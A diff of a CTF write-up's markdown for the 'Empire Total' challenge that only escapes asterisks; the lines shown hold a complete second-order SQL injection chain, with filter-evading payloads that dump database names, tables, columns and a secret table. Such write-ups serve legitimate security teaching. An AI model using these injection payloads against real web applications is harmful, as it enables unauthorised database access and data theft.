@@ -113,7 +113,7 @@ We have control over the **url['URL']** parameter (the url we scan in VirusTotal
 In order to test the injection locally i have created this small script that connects to my local DB and executes the same query, you can find it **[HERE](https://github.com/kahla-sec/CTF-Writeups/blob/master/Securinets%20Prequals%202k20/Empire%20Total/test.py)** 
 
 Finally I opted to this solution, here is the URL we will scan :
-> http://100.26.206.184/?u=',(select/**/1),(select/**/2)),('102','a
+> http://100.26.206.184/?u=',(select/\*\*/1),(select/\*\*/2)),('102','a
 
 The complete SQL query that will be executed is  :
 > INSERT INTO detected_urls (ip_id,url,detections,scanned_time) VALUES ('2','100.26.206.184/?u=',(select 1),(select 2)),('102','a','15','yes')
@@ -134,7 +134,7 @@ Bingo ! our injection worked , we only have to dump the entire Database now and 
 
 1. Dump DB names :
 
-> http://100.26.206.184/?u=',(select/**/gRoUp_cOncaT(0x7c,schema_name,0x7c)/**/fRoM/**/information_schema.schemata),(select/**/2)),('102','a
+> http://100.26.206.184/?u=',(select/\*\*/gRoUp_cOncaT(0x7c,schema_name,0x7c)/\*\*/fRoM/\*\*/information_schema.schemata),(select/\*\*/2)),('102','a
 
 ![TASK](https://imgur.com/AJvdMXB.png)
 
@@ -142,9 +142,9 @@ DBName : MySecretDatabase
 
 2. Dump Tables and Columns :
 
-> http://100.26.206.184/?u=',(select/**/gRoUp_cOncaT(0x7c,table_name,0x7c)/**/fRoM/**/information_schema.tables),(select/**/2)),('102','a
+> http://100.26.206.184/?u=',(select/\*\*/gRoUp_cOncaT(0x7c,table_name,0x7c)/\*\*/fRoM/\*\*/information_schema.tables),(select/\*\*/2)),('102','a
 
-> http://100.26.206.184/?u=',(select/**/gRoUp_cOncaT(0x7c,column_name,0x7c)/**/fRoM/**/information_schema.columns),(select/**/2)),('103','a
+> http://100.26.206.184/?u=',(select/\*\*/gRoUp_cOncaT(0x7c,column_name,0x7c)/\*\*/fRoM/\*\*/information_schema.columns),(select/\*\*/2)),('103','a
 
 ![TASK](https://imgur.com/raYuUmI.png)
 
@@ -152,7 +152,7 @@ DBName : MySecretDatabase
 
 3. And finally let's have our beloved flag :
 
-> http://100.26.206.184/?u=',(select/**/group_concat(0x7c,secret_value,0x7c)/**/fRoM/**/MySecretDatabase.SecretTable),(select/**/2)),('109','a
+> http://100.26.206.184/?u=',(select/\*\*/group_concat(0x7c,secret_value,0x7c)/\*\*/fRoM/\*\*/MySecretDatabase.SecretTable),(select/\*\*/2)),('109','a
 
 ![TASK](https://imgur.com/FanWbUZ.png)
 
